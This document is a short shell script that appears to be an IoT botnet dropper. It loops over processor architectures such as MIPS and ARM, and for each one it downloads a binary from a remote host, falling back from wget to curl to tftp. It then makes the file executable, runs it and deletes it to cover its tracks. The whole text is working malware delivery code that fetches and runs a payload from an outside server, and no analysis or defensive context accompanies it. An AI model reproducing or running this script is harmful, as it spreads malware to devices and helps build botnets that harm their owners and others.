binarys="mips mipsel x86_64 arm7 arm arm6 arm5 i586 i686"
server_ip="jhbaghjbasdg.shop/nmbxcvasg"

for arch in $binarys
do
rm -rf $arch
wget http://$server_ip/$arch || curl -O http://$server_ip/$arch || tftp $server_ip -c get $arch || tftp -g -r $arch $server_ip
chmod 777 $arch
./$arch ssh
rm -rf $arch
done